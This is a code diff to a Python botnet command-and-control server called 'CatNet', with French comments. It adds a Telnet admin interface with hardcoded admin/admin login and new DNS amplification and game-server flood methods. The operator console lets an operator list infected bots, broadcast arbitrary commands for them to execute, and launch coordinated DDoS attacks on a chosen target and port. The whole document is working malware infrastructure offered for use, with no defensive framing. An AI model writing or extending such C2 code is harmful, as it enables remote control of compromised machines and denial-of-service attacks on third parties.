@@ -14,6 +14,7 @@ from datetime import datetime
 HOST = '0.0.0.0'
 PORT = 1337
 HTTP_PORT = 80
+ADMIN_PORT = 2323 # Port pour connexion PuTTY/Telnet
 MAX_CONNECTIONS = 900
 BINARIES_DIR = os.path.dirname(os.path.abspath(__file__))
 
@@ -21,7 +22,8 @@ DDOS_METHODS = {
     "syn": "Flood SYN", "ack": "Flood ACK", "udp": "Flood UDP",
     "tcp": "Flood TCP", "icmp": "Flood ICMP", "http": "Flood HTTP",
     "slowloris": "Slowloris", "rudy": "RUDY", "arme": "ARME",
-    "hulk": "HULK", "mix": "Mix", "bypass": "Bypass"
+    "hulk": "HULK", "mix": "Mix", "bypass": "Bypass",
+    "dns": "DNS Amplification", "vse": "Valve Source Engine"
 }
 
 class BotnetC2:
@@ -110,6 +112,83 @@ class BotnetC2:
         self.total_commands += count
         return count
 
+    def command_interface(self):
+        while self.running:
+            try:
+                cmd = input(f"\n[Bots: {len(self.connected_bots)}] > ").strip().split()
+                if not cmd: continue
+                self.process_command(cmd, sys.stdout)
+            except EOFError:
+                break
+
+    def process_command(self, cmd, out):
+        action = cmd[0]
+        if action == "list":
+            with self.lock:
+                out.write(f"{'ID':<5} | {'IP':<15} | {'Hostname':<20} | {'Arch':<10}\n")
+                out.write("-" * 60 + "\n")
+                for i, b in enumerate(self.connected_bots):
+                    out.write(f"{i:<5} | {b['ip']:<15} | {b['hostname']:<20} | {b['arch']:<10}\n")
+        elif action == "broadcast" and len(cmd) > 1:
+            n = self.broadcast("EXEC " + " ".join(cmd[1:]))
+            out.write(f"Envoyé à {n} bots\n")
+        elif action == "ddos-all" and len(cmd) > 2:
+            target = cmd[1]
+            duration = cmd[2]
+            method = cmd[3] if len(cmd) > 3 else 'mix'
+            port = cmd[4] if len(cmd) > 4 else '80'
+            n = self.broadcast(f"DDOS {target} {port} {duration} {method}")
+            out.write(f"Attaque {method} lancée sur {target}:{port} pendant {duration}s avec {n} bots\n")
+        elif action == "status":
+            out.write(f"Infections: {self.total_infections} | DDoS: {self.active_ddos}\n")
+        elif action == "help":
+            out.write("Commandes: list, broadcast <cmd>, ddos-all <target> <duration> <method> [port], status, exit\n")
+        elif action == "exit":
+            self.running = False
+            sys.exit(0)
+
+    def handle_admin(self, admin_socket, address):
+        admin_socket.send(b"\r\nCatNet Admin Login: ")
+        # Login basique pour la démonstration
+        login = admin_socket.recv(1024).decode().strip()
+        admin_socket.send(b"Password: ")
+        password = admin_socket.recv(1024).decode().strip()
+        
+        if login == "admin" and password == "admin":
+            admin_socket.send(b"\r\nWelcome to CatNet C2 Admin Interface\r\n")
+            while self.running:
+                admin_socket.send(f"\r\n[Bots: {len(self.connected_bots)}] admin> ".encode())
+                try:
+                    data = admin_socket.recv(1024).decode().strip()
+                    if not data: break
+                    if data == "logout": break
+                    
+                    cmd = data.split()
+                    # Rediriger la sortie vers le socket admin
+                    import io
+                    output = io.StringIO()
+                    self.process_command(cmd, output)
+                    admin_socket.send(output.getvalue().replace("\n", "\r\n").encode())
+                except: break
+        else:
+            admin_socket.send(b"Login failed.\r\n")
+        admin_socket.close()
+
+    def admin_listener(self):
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        try:
+            server.bind((HOST, ADMIN_PORT))
+            server.listen(5)
+            self.log(f"Admin C2 démarré sur {ADMIN_PORT} (PuTTY)")
+            while self.running:
+                client, addr = server.accept()
+                threading.Thread(target=self.handle_admin, args=(client, addr), daemon=True).start()
+        except Exception as e:
+            self.log(f"Erreur Admin C2: {e}", "ERROR")
+        finally:
+            server.close()
+
     def run_server(self):
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -125,27 +204,6 @@ class BotnetC2:
         finally:
             server.close()
 
-    def command_interface(self):
-        while self.running:
-            cmd = input(f"\n[Bots: {len(self.connected_bots)}] > ").strip().split()
-            if not cmd: continue
-            
-            action = cmd[0]
-            if action == "list":
-                with self.lock:
-                    for i, b in enumerate(self.connected_bots):
-                        print(f"{i}. {b['ip']} | {b['hostname']} | {b['arch']}")
-            elif action == "broadcast" and len(cmd) > 1:
-                n = self.broadcast("EXEC " + " ".join(cmd[1:]))
-                print(f"Envoyé à {n} bots")
-            elif action == "ddos-all" and len(cmd) > 2:
-                self.broadcast(f"DDOS {cmd[1]} {cmd[2]} {cmd[3] if len(cmd)>3 else 'mix'}")
-            elif action == "status":
-                print(f"Infections: {self.total_infections} | DDoS: {self.active_ddos}")
-            elif action == "exit":
-                self.running = False
-                sys.exit(0)
-
 def start_http():
     class Handler(http.server.SimpleHTTPRequestHandler):
         def log_message(self, *args): pass
@@ -158,4 +216,5 @@ if __name__ == "__main__":
     c2 = BotnetC2()
     threading.Thread(target=start_http, daemon=True).start()
     threading.Thread(target=c2.run_server, daemon=True).start()
+    threading.Thread(target=c2.admin_listener, daemon=True).start()
     c2.command_interface()
